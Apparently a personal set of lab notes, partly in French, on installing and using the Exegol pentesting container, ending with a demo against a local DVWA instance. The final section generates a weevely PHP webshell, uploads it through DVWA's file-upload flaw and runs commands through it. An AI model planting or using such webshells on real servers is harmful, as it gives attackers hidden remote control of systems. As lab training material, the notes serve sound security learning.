# exegol
* INSTALLATION 
```
apt install git-all
```
```
git version
```
```
apt install python3
```
```
python3 --version
```
```
apt install python3-pip
```
```
pip --version
```
```
apt install curl
```
```
apt install argcomplete
```

installing docker : 
```
python3 -m  pip install exegol
```
```
apt install bash-completion
```
```
export PATH="$HOME/.local/bin:$PATH"
```
```
sudo exegol -h
```
```
sudo exegol info
```
```
exegol start -h
```
```
exegol start demo light
```
```
nmap localhost
```
```
exit
```
```
sudo exegol info
```
```
exegol stop demo
```

* OPTIONS VPN: 
```
sudo exegol start hackthebox --vpn <chemin_conf_vpn>
```
oublier l'image : il va remettre le tableau et proprosé :  </br>
veuillez rajouter resolv.conf : </br>
Tester ping </br>
 
* DEMO2 : DESKTOP
```
sudo exegol start demo2 light --desktop
```
ouvrir lien dans firefox </br>
id : root </br>
mdp : copier coller </br>
```
exit 
```
* LOG
ascinema (historique) 
```
sudo exegol start demo2 light --l
```
```
ls
```
```
cd logs
```
```
ls asciinema xxx.asciinema
```
```
sudo ls /root/.exegol/workspaces/demo2/logs
```

* demos 4 : 
```
exegol install nightly
```
```
exegol start master
```
```
burpsuitecommunity
```
```
docker run --rm  -p 80:80 vulnerables/web-dvwa
```
login : admin </br>
password : password </br>
click upload : eicar.exe (detectér antivirus) </br>
```
weevly : webshell
```
```
weevly generate MyPass beacon.php
```
```
weevly http://localhost/hackable/uploads/beacon.php beacon.php
```
```
id
```
```
ls -al
```
```
echo "GET PWN"
```







  



